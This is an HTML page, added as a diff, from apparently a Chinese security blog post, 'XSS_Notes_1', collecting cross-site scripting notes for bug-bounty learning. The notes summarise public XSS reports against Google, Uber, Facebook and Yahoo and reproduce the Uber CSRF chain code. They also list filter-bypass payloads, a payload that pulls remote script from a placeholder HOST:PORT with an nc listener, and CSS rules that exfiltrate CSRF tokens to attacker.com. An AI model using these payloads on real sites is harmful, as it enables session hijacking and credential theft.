@@ -1,0 +1,774 @@
+<!DOCTYPE html>
+<html lang="">
+    <!-- title -->
+
+
+
+
+<!-- keywords -->
+
+
+
+
+<head><meta name="generator" content="Hexo 3.8.0">
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="author" content="H1e4a0r1t">
+    <meta name="renderer" content="webkit">
+    <meta name="copyright" content="H1e4a0r1t">
+    
+    <meta name="keywords" content="hexo,hexo-theme,hexo-blog">
+    
+    <meta name="description" content>
+    <meta http-equiv="Cache-control" content="no-cache">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <title>XSS_Notes_1 · H0e4a0r1t&#39;s Blog</title>
+    <style type="text/css">
+    @font-face {
+        font-family: 'Oswald-Regular';
+        src: url("/font/Oswald-Regular.ttf");
+    }
+
+    body {
+        margin: 0;
+    }
+
+    header,
+    footer,
+    .back-top,
+    .sidebar,
+    .container,
+    .site-intro-meta,
+    .toc-wrapper {
+        display: none;
+    }
+
+    .site-intro {
+        position: relative;
+        z-index: 3;
+        width: 100%;
+        /* height: 50vh; */
+        overflow: hidden;
+    }
+
+    .site-intro-placeholder {
+        position: absolute;
+        z-index: -2;
+        top: 0;
+        left: 0;
+        width: calc(100% + 300px);
+        height: 100%;
+        background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
+        background-position: center center;
+        transform: translate3d(-226px, 0, 0);
+        animation: gradient-move 2.5s ease-out 0s infinite;
+    }
+
+    @keyframes gradient-move {
+        0% {
+            transform: translate3d(-226px, 0, 0);
+        }
+        100% {
+            transform: translate3d(0, 0, 0);
+        }
+    }
+
+</style>
+
+    <link rel="preload" href="/css/style.css?v=20180824" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    <link rel="stylesheet" href="/css/mobile.css?v=20180824" media="(max-width: 980px)">
+    
+    <link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    
+    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
+/* This file is meant as a standalone workflow for
+- testing support for link[rel=preload]
+- enabling async CSS loading in browsers that do not support rel=preload
+- applying rel preload css once loaded, whether supported or not.
+*/ -->
+<script>
+(function( w ){
+	"use strict";
+	// rel=preload support test
+	if( !w.loadCSS ){
+		w.loadCSS = function(){};
+	}
+	// define on the loadCSS obj
+	var rp = loadCSS.relpreload = {};
+	// rel=preload feature support test
+	// runs once and returns a function for compat purposes
+	rp.support = (function(){
+		var ret;
+		try {
+			ret = w.document.createElement( "link" ).relList.supports( "preload" );
+		} catch (e) {
+			ret = false;
+		}
+		return function(){
+			return ret;
+		};
+	})();
+
+	// if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+	// then change that media back to its intended value on load
+	rp.bindMediaToggle = function( link ){
+		// remember existing media attr for ultimate state, or default to 'all'
+		var finalMedia = link.media || "all";
+
+		function enableStylesheet(){
+			link.media = finalMedia;
+		}
+
+		// bind load handlers to enable media
+		if( link.addEventListener ){
+			link.addEventListener( "load", enableStylesheet );
+		} else if( link.attachEvent ){
+			link.attachEvent( "onload", enableStylesheet );
+		}
+
+		// Set rel and non-applicable media type to start an async request
+		// note: timeout allows this to happen async to let rendering continue in IE
+		setTimeout(function(){
+			link.rel = "stylesheet";
+			link.media = "only x";
+		});
+		// also enable media after 3 seconds,
+		// which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+		setTimeout( enableStylesheet, 3000 );
+	};
+
+	// loop through link elements in DOM
+	rp.poly = function(){
+		// double check this to prevent external calls from running
+		if( rp.support() ){
+			return;
+		}
+		var links = w.document.getElementsByTagName( "link" );
+		for( var i = 0; i < links.length; i++ ){
+			var link = links[ i ];
+			// qualify links to those with rel=preload and as=style attrs
+			if( link.rel === "preload" && link.getAttribute( "as" ) === "style" && !link.getAttribute( "data-loadcss" ) ){
+				// prevent rerunning on link
+				link.setAttribute( "data-loadcss", true );
+				// bind listeners to toggle media back
+				rp.bindMediaToggle( link );
+			}
+		}
+	};
+
+	// if unsupported, run the polyfill
+	if( !rp.support() ){
+		// run once at least
+		rp.poly();
+
+		// rerun poly on an interval until onload
+		var run = w.setInterval( rp.poly, 500 );
+		if( w.addEventListener ){
+			w.addEventListener( "load", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		} else if( w.attachEvent ){
+			w.attachEvent( "onload", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		}
+	}
+
+
+	// commonjs
+	if( typeof exports !== "undefined" ){
+		exports.loadCSS = loadCSS;
+	}
+	else {
+		w.loadCSS = loadCSS;
+	}
+}( typeof global !== "undefined" ? global : this ) );
+</script>
+
+    <link rel="icon" href="/assets/favicon.ico">
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js" as="script">
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" as="script">
+    <link rel="preload" href="/scripts/main.js" as="script">
+    <link rel="preload" as="font" href="/font/Oswald-Regular.ttf" crossorigin>
+    <link rel="preload" as="font" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" crossorigin>
+    
+    <!-- fancybox -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.js" defer></script>
+    <!-- 百度统计  -->
+    
+    <!-- 谷歌统计  -->
+    
+</head>
+
+    
+        <body class="post-body">
+    
+    
+<header class="header">
+
+    <div class="read-progress"></div>
+    <div class="header-sidebar-menu">&#xe775;</div>
+    <!-- post页的toggle banner  -->
+    
+    <div class="banner">
+            <div class="blog-title">
+                <a href="/">H0e4a0r1t&#39;s Blog</a>
+            </div>
+            <div class="post-title">
+                <a href="#" class="post-name">XSS_Notes_1</a>
+            </div>
+    </div>
+    
+    <a class="home-link" href="/">H0e4a0r1t's Blog</a>
+</header>
+    <div class="wrapper">
+        <div class="site-intro" style="
+
+
+
+
+
+
+
+height:50vh;
+">
+    
+    <!-- 主页  -->
+    
+    
+    <!-- 404页  -->
+            
+    <div class="site-intro-placeholder"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/post-bg.jpg)"></div>
+    <div class="site-intro-meta">
+        <!-- 标题  -->
+        <h1 class="intro-title">
+            <!-- 主页  -->
+            
+            XSS_Notes_1
+            <!-- 404 -->
+            
+        </h1>
+        <!-- 副标题 -->
+        <p class="intro-subtitle">
+            <!-- 主页副标题  -->
+            
+            
+            <!-- 404 -->
+            
+        </p>
+        <!-- 文章页meta -->
+        
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                
+                
+                    <div class="post-intro-read">
+                        <span>字数统计: <span class="post-count word-count">1.5k</span>阅读时长: <span class="post-count reading-time">7 min</span></span>
+                    </div>
+                
+                <div class="post-intro-meta">
+                    <span class="post-intro-calander iconfont-archer">&#xe676;</span>
+                    <span class="post-intro-time">2019/04/22</span>
+                    
+                    <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                        <span class="iconfont-archer">&#xe602;</span>
+                        <span id="busuanzi_value_page_pv"></span>
+                    </span>
+                    
+                    <span class="shareWrapper">
+                        <span class="iconfont-archer shareIcon">&#xe71d;</span>
+                        <span class="shareText">Share</span>
+                        <ul class="shareList">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
+        
+    </div>
+</div>
+        <script>
+ 
+  // get user agent
+  var browser = {
+    versions: function () {
+      var u = window.navigator.userAgent;
+      return {
+        userAgent: u,
+        trident: u.indexOf('Trident') > -1, //IE内核
+        presto: u.indexOf('Presto') > -1, //opera内核
+        webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
+        gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
+        mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
+        ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
+        android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
+        iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
+        iPad: u.indexOf('iPad') > -1, //是否为iPad
+        webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
+        weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
+        uc: u.indexOf('UCBrowser') > -1 //是否为android下的UC浏览器
+      };
+    }()
+  }
+  console.log("userAgent:" + browser.versions.userAgent);
+
+  // callback
+  function fontLoaded() {
+    console.log('font loaded');
+    if (document.getElementsByClassName('site-intro-meta')) {
+      document.getElementsByClassName('intro-title')[0].classList.add('intro-fade-in');
+      document.getElementsByClassName('intro-subtitle')[0].classList.add('intro-fade-in');
+      var postIntros = document.getElementsByClassName('post-intros')[0]
+      if (postIntros) {
+        postIntros.classList.add('post-fade-in');
+      }
+    }
+  }
+
+  // UC不支持跨域，所以直接显示
+  function asyncCb(){
+    if (browser.versions.uc) {
+      console.log("UCBrowser");
+      fontLoaded();
+    } else {
+      WebFont.load({
+        custom: {
+          families: ['Oswald-Regular']
+        },
+        loading: function () {  //所有字体开始加载
+          // console.log('loading');
+        },
+        active: function () {  //所有字体已渲染
+          fontLoaded();
+        },
+        inactive: function () { //字体预加载失败，无效字体或浏览器不支持加载
+          console.log('inactive: timeout');
+          fontLoaded();
+        },
+        timeout: 5000 // Set the timeout to two seconds
+      });
+    }
+  }
+
+  function asyncErr(){
+    console.warn('script load from CDN failed, will load local script')
+  }
+
+  // load webfont-loader async, and add callback function
+  function async(u, cb, err) {
+    var d = document, t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+    o.src = u;
+    if (cb) { o.addEventListener('load', function (e) { cb(null, e); }, false); }
+    if (err) { o.addEventListener('error', function (e) { err(null, e); }, false); }
+    s.parentNode.insertBefore(o, s);
+  }
+
+  var asyncLoadWithFallBack = function(arr, success, reject) {
+      var currReject = function(){
+        reject()
+        arr.shift()
+        if(arr.length)
+          async(arr[0], success, currReject)
+        }
+
+      async(arr[0], success, currReject)
+  }
+
+  asyncLoadWithFallBack([
+    "https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js", 
+    "https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js",
+    "/lib/webfontloader.min.js"
+  ], asyncCb, asyncErr)
+</script>        
+        <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
+        <div class="container container-unloaded">
+            <main class="main post-page">
+    <article class="article-entry">
+        <h1 id="XSS-Notes"><a href="#XSS-Notes" class="headerlink" title="XSS_Notes"></a>XSS_Notes</h1><h3 id="主要挖掘方法：Burpsuite-and-WFuzz"><a href="#主要挖掘方法：Burpsuite-and-WFuzz" class="headerlink" title="主要挖掘方法：Burpsuite and WFuzz"></a>主要挖掘方法：Burpsuite and WFuzz</h3><h2 id="0x00-新思路"><a href="#0x00-新思路" class="headerlink" title="0x00.新思路"></a>0x00.新思路</h2><h3 id="文件上传："><a href="#文件上传：" class="headerlink" title="文件上传："></a>文件上传：</h3><ul>
+<li>在文件名插入payload，即<svg onload="alert(1)">.jpg  </svg></li>
+<li>在文件内容中添加payload，如果为前端加载即触发</li>
+</ul>
+<h3 id="更多bypass变形-》-《XSS-Cheat-Sheet-2019-Edition-2》"><a href="#更多bypass变形-》-《XSS-Cheat-Sheet-2019-Edition-2》" class="headerlink" title="更多bypass变形 =》 《XSS-Cheat-Sheet-2019-Edition-2》"></a>更多bypass变形 =》 《XSS-Cheat-Sheet-2019-Edition-2》</h3><h2 id="0x01-案例分析"><a href="#0x01-案例分析" class="headerlink" title="0x01.案例分析"></a>0x01.案例分析</h2><h3 id="1-BugBounty-Sleeping-stored-Google-XSS-Awakens-a-5000-Bounty-by-Patrik-Fehrenbach"><a href="#1-BugBounty-Sleeping-stored-Google-XSS-Awakens-a-5000-Bounty-by-Patrik-Fehrenbach" class="headerlink" title="1.[BugBounty] Sleeping stored Google XSS Awakens a $5000 Bounty  by Patrik Fehrenbach"></a>1.<a href="https://blog.it-securityguard.com/bugbounty-sleeping-stored-google-xss-awakens-a-5000-bounty/" target="_blank" rel="noopener">[BugBounty] Sleeping stored Google XSS Awakens a $5000 Bounty</a>  by Patrik Fehrenbach</h3><p>思路(存储型xss)：创建项目时，在项目标题处添加payload，添加时会被转义，而执行删除操作时会被执行</p>
+<p>payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;img src=x onerror=prompt(1);&gt;     ||    &quot;&gt;&lt;img src = x onerror = javascript: alert (1); &gt;</span><br></pre></td></tr></table></figure>
+<h3 id="2-Uber-Bug-Bounty-Turning-Self-XSS-into-Good-XSS"><a href="#2-Uber-Bug-Bounty-Turning-Self-XSS-into-Good-XSS" class="headerlink" title="2.Uber Bug Bounty: Turning Self-XSS into Good-XSS"></a>2.<a href="https://whitton.io/articles/uber-turning-self-xss-into-good-xss/" target="_blank" rel="noopener">Uber Bug Bounty: Turning Self-XSS into Good-XSS</a></h3><p>思路(CSRF+存储型XSS)：地址栏处插入存储型XSS,搭配CSRF将Self-XSS转换为可以获取其他用户cookie的XSS，将危害扩大化</p>
+<p>由于用户是先访问partner.uber.com，通过login.uber.com跳转到授权服务器get到token再跳转回partner.uber.com并携带token，注销时也会先销毁partner.uber.com的session再销毁login.uber.com的session</p>
+<p>CSRF目的：让用户退出当前会话，但是保留session，即销毁partner.uber.com的session，保留login.uber.com的session，登陆到我们的账号访问我们自己的xss_payload，再跳回用户的界面使我们的payload继续执行，从而获取到敏感信息</p>
+<p>payload：<script>alert(document.domain);</script></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- 设置内容安全策略以拦截对login.uber.com的请求，使得目标维护其会话 --&gt;</span><br><span class="line">&lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;img-src https://partners.uber.com&quot;&gt;</span><br><span class="line">&lt;!-- 注销用户 --&gt;</span><br><span class="line">&lt;!-- 因为内容安全策略会报错，所以用于执行下一步登录操作 --&gt;</span><br><span class="line">&lt;img src=&quot;https://partners.uber.com/logout/&quot; onerror=&quot;login();&quot;&gt;</span><br><span class="line">&lt;!-- 模拟登录我们的账号 --&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    //Initiate login so that we can redirect them</span><br><span class="line">    var login = function() &#123;</span><br><span class="line">        var loginImg = document.createElement(&apos;img&apos;); </span><br><span class="line">        loginImg.src = &apos;https://partners.uber.com/login/&apos;;   //将payload中的注销页面换成登录页面</span><br><span class="line">        loginImg.onerror = redir;   //执行登录操作</span><br><span class="line">    &#125;</span><br><span class="line">    //Redirect them to login with our code</span><br><span class="line">    var redir = function() &#123;</span><br><span class="line">        //Get the code from the URL to make it easy for testing</span><br><span class="line">        var code = window.location.hash.slice(1);</span><br><span class="line">        var loginImg2 = document.createElement(&apos;img&apos;);</span><br><span class="line">        loginImg2.src = &apos;https://partners.uber.com/oauth/callback?code=&apos; + code;</span><br><span class="line">        loginImg2.onerror = function() &#123;</span><br><span class="line">            //重定向至带有payload的配置文件页</span><br><span class="line">            window.location = &apos;https://partners.uber.com/profile/&apos;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    //创建iframe以将用户从我们的帐户注销并重新登录到他们的帐户</span><br><span class="line">    var loginIframe = document.createElement(&apos;iframe&apos;);</span><br><span class="line">    loginIframe.setAttribute(&apos;src&apos;, &apos;https://存有payload的ifrome页面&apos;);</span><br><span class="line">    document.body.appendChild(loginIframe);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<p>iframe标签内的内容</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- 同上，设置内容安全策略以拦截对login.uber.com的请求，使得目标维护其会话 --&gt;</span><br><span class="line">&lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;img-src partners.uber.com&quot;&gt;</span><br><span class="line">&lt;!-- Log the user out of our partner account --&gt;</span><br><span class="line">&lt;img src=&quot;https://partners.uber.com/logout/&quot; onerror=&quot;redir();&quot;&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    //让用户返回他们自己的账号</span><br><span class="line">    var redir = function() &#123;</span><br><span class="line">        window.location = &apos;https://partners.uber.com/login/&apos;;</span><br><span class="line">    &#125;;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">//创建里一个iframe用来存放获取到的用户信息</span><br><span class="line">setTimeout(function() &#123;</span><br><span class="line">    var profileIframe = document.createElement(&apos;iframe&apos;);</span><br><span class="line">    profileIframe.setAttribute(&apos;src&apos;, &apos;https://partners.uber.com/profile/&apos;);</span><br><span class="line">    profileIframe.setAttribute(&apos;id&apos;, &apos;pi&apos;);</span><br><span class="line">    document.body.appendChild(profileIframe);</span><br><span class="line">    //Extract their email as PoC</span><br><span class="line">    profileIframe.onload = function() &#123;</span><br><span class="line">        var d = document.getElementById(&apos;pi&apos;).contentWindow.document.body.innerHTML;</span><br><span class="line">        var matches = /value=&quot;([^&quot;]+)&quot; name=&quot;email&quot;/.exec(d);</span><br><span class="line">        alert(matches[1]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;, 9000);</span><br></pre></td></tr></table></figure>
+<h3 id="3-Three-Stored-XSS-in-Facebook"><a href="#3-Three-Stored-XSS-in-Facebook" class="headerlink" title="3.Three Stored XSS in Facebook"></a>3.<a href="http://www.breaksec.com/?p=6129" target="_blank" rel="noopener">Three Stored XSS in Facebook</a></h3><p>① <strong>在Facebook聊天中存储XSS</strong></p>
+<p>用户启动有预览的新消息时，帖子上方会有预览的GUI，而显示该链接的参数为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">attachment[params][title],attachment[params][urlInfo][final]</span><br></pre></td></tr></table></figure>
+<p>而其未对此做验证，即(http or https)，so可以改为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">attachment[params][title],attachment[params][urlInfo][final]=&lt;a href=&quot;javascript:alert(document.domain)&quot;&gt; PoC Click Me &lt;/a&gt;</span><br></pre></td></tr></table></figure>
+<p>当用户点击恶意链接时，触发XSS_Payload</p>
+<p>② <strong>Facebook存储XSS</strong></p>
+<p>在记录攻击者去过的地方功能，新建一个位置，在地址处插入XSS_Payload,当用户想要查看时，触发</p>
+<p>③ <strong>Facebook Messenger中存储的XSS（Windows）</strong></p>
+<p>用户注册的地方已做xss校验，创建一个新页面，将name改为  &lt;img src =“a.jpg” onerror = javascript:alert(1) &gt;，然后从该页面向受害者发送消息，每次受害者登录Facebook Messenger时，都会在其帐户上运行存储的XSS Payload</p>
+<h3 id="4-Persistent-XSS-on-myworld-ebay-com"><a href="#4-Persistent-XSS-on-myworld-ebay-com" class="headerlink" title="4. Persistent XSS on myworld.ebay.com"></a>4. <a href="https://whitton.io/archive/persistent-xss-on-myworld-ebay-com/" target="_blank" rel="noopener">Persistent XSS on myworld.ebay.com</a></h3><h3 id="5-Complicated-Best-Report-of-Google-XSS"><a href="#5-Complicated-Best-Report-of-Google-XSS" class="headerlink" title="5. Complicated, Best Report of Google XSS"></a>5. <a href="https://sites.google.com/site/bughunteruniversity/best-reports/account-recovery-xss" target="_blank" rel="noopener">Complicated, Best Report of Google XSS</a></h3><h3 id="6-Tricky-Html-Injection-and-Possible-XSS-in-sms-be-vip-twitter-com"><a href="#6-Tricky-Html-Injection-and-Possible-XSS-in-sms-be-vip-twitter-com" class="headerlink" title="6. Tricky Html Injection and Possible XSS in sms-be-vip.twitter.com"></a>6. <a href="https://hackerone.com/reports/150179" target="_blank" rel="noopener">Tricky Html Injection and Possible XSS in sms-be-vip.twitter.com</a></h3><h3 id="7-Yahoo-Mail-stored-XSS"><a href="#7-Yahoo-Mail-stored-XSS" class="headerlink" title="7. Yahoo Mail stored XSS"></a>7. <a href="https://klikki.fi/adv/yahoo.html" target="_blank" rel="noopener">Yahoo Mail stored XSS</a></h3><h2 id="0x02-Bypass"><a href="#0x02-Bypass" class="headerlink" title="0x02.Bypass"></a>0x02.Bypass</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">xmp</span><br><span class="line">&lt;xmp&gt;&lt;p title=&quot;&lt;/xmp&gt;&lt;svg/onload=alert(45)&gt;&quot;&gt;</span><br><span class="line">&lt;xmp&gt;&lt;p title=&quot;&lt;/xmp&gt;&lt;script&gt;alert(0)&lt;/script&gt;&quot;&gt;</span><br><span class="line"></span><br><span class="line">noscript</span><br><span class="line">&lt;noscript&gt;&lt;p title=&quot;&lt;/noscript&gt;&lt;svg/onload=alert(45)&gt;”&gt;</span><br><span class="line"></span><br><span class="line">noframes</span><br><span class="line">&lt;noframes&gt;&lt;p title=&quot;&lt;/noframes&gt;&lt;svg/onload=alert(45)&gt;”&gt;</span><br><span class="line"></span><br><span class="line">iframe</span><br><span class="line">&lt;iframe&gt;&lt;p title=&quot;&lt;/iframe&gt;&lt;svg/onload=alert(45)&gt;&quot;&gt;</span><br><span class="line"></span><br><span class="line">noembed</span><br><span class="line">&lt;noembed&gt;&lt;img src=&quot;&lt;/noembed&gt;&lt;iframe onload=alert(1)&gt;&quot; /&gt;&lt;/noembed&gt;</span><br><span class="line"></span><br><span class="line">&lt;object data=data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+&gt;&lt;/object&gt;</span><br><span class="line"></span><br><span class="line">绕过删除&lt;script&gt;及on开头的事件</span><br><span class="line">&quot;/&gt;&lt;svg/on&lt;script&gt;load=prompt(document.domain);&gt;</span><br><span class="line">&quot;/&gt;&lt;svg/on&lt;script&gt;load=prompt(document.cookie);&gt;</span><br></pre></td></tr></table></figure>
+<h2 id="0x03-骚思路"><a href="#0x03-骚思路" class="headerlink" title="0x03.骚思路"></a>0x03.骚思路</h2><h3 id="1-在输入限制中的xss"><a href="#1-在输入限制中的xss" class="headerlink" title="1.在输入限制中的xss"></a>1.在输入限制中的xss</h3><p>测试靶场：<a href="https://brutelogic.com.br/tests/input-formats.php" target="_blank" rel="noopener">https://brutelogic.com.br/tests/input-formats.php</a></p>
+<p>😀 简单的依赖邮件格式：</p>
+<p><img src="https://i.loli.net/2019/04/12/5cb044d6148d5.png" alt></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>😀 页面跳转处，校验格式  protocol：// reference</p>
+<p><img src="https://i.loli.net/2019/04/12/5cb046235ea77.png" alt></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://brutelogic.com.br/tests/input-formats.php?url1=javascript://%250Aalert(1)           </span><br><span class="line">                                                     //javascript://%0aalert(1)</span><br></pre></td></tr></table></figure>
+<p>😀 页面跳转处（带查询）</p>
+<p><img src="https://i.loli.net/2019/04/12/5cb046f775fa0.png" alt></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>😀 密钥</p>
+<p><img src="https://i.loli.net/2019/04/12/5cb04ca8a0dbf.png" alt></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://brutelogic.com.br/tests/input-formats.php?key=12345678910&lt;svg/onload=alert(1)&gt;</span><br></pre></td></tr></table></figure>
+<h3 id="2-使用XSS控制浏览器"><a href="#2-使用XSS控制浏览器" class="headerlink" title="2.使用XSS控制浏览器"></a>2.使用XSS控制浏览器</h3><p><a href="https://brutelogic.com.br/blog/using-xss-to-control-a-browser/" target="_blank" rel="noopener">https://brutelogic.com.br/blog/using-xss-to-control-a-browser/</a></p>
+<p>Payload:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg onload=setInterval(function()&#123;d = document; z = d.createElement（&quot;script&quot;）; z.src =&quot;//HOST：PORT&quot;; d.body.appendChild(z)&#125;，0)&gt;</span><br><span class="line"></span><br><span class="line">&lt;svg/onload=setInterval(function()&#123;with(document)body.appendChild(createElement(“script”)).src=”//HOST:PORT”&#125;,0)&gt;</span><br></pre></td></tr></table></figure>
+<p>attacker</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ while :; do printf &quot;j$ &quot;; read c; echo $c | nc -lp PORT &gt;/dev/null; done</span><br></pre></td></tr></table></figure>
+<h3 id="3-CSS版XSS"><a href="#3-CSS版XSS" class="headerlink" title="3.CSS版XSS"></a>3.CSS版XSS</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">input [ name = csrf ] [ value ^ = cb ] &#123;     //获取以cb开头的csrf_token</span><br><span class="line">    background-image： url（ https://attacker.com/exfil/cb）;</span><br><span class="line">&#125;</span><br><span class="line">form ：has（input [ name = csrf ] [ value ^ = token ]）&#123;    //获取在表单中存在token的csrf</span><br><span class="line">    background-image： url（ https://attacker.com/exfil/token）;</span><br><span class="line">&#125;</span><br><span class="line">外部样式引用</span><br><span class="line">@import url（http://laggysite.com/base.css）;</span><br></pre></td></tr></table></figure>
+<h4 id="4-jQuary"><a href="#4-jQuary" class="headerlink" title="4. jQuary"></a>4. jQuary</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$.getScript`//xss.example.com/xss.js`</span><br></pre></td></tr></table></figure>
+<h3 id="5-设置定时"><a href="#5-设置定时" class="headerlink" title="5. 设置定时"></a>5. 设置定时</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setTimeout`alert\x28document.domain\x29`</span><br></pre></td></tr></table></figure>
+
+    </article>
+    <!-- license  -->
+    
+        <div class="license-wrapper">
+            <p>原文作者：<a href="http://yoursite.com">H1e4a0r1t</a>
+            </p><p>原文链接：<a href="http://yoursite.com/2019/04/22/XSS_Note_1/">http://yoursite.com/2019/04/22/XSS_Note_1/</a>
+            </p><p>发表日期：<a href="http://yoursite.com/2019/04/22/XSS_Note_1/">April 22nd 2019, 2:37:22 pm</a>
+            </p><p>更新日期：<a href="http://yoursite.com/2019/04/22/XSS_Note_1/">April 22nd 2019, 2:38:21 pm</a>
+            </p><p>版权声明：本文采用<a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
+        </div>
+    
+    <!-- paginator  -->
+    <ul class="post-paginator">
+        <li class="next">
+            
+        </li>
+        <li class="previous">
+            
+                <div class="prevSlogan">Previous Post</div>
+                <a href="/2019/04/22/Recon新思路/" title="Recon 新思路">
+                    <div class="prevTitle">Recon 新思路</div>
+                </a>
+            
+        </li>
+    </ul>
+    <!-- 评论插件 -->
+    <!-- 来必力City版安装代码 -->
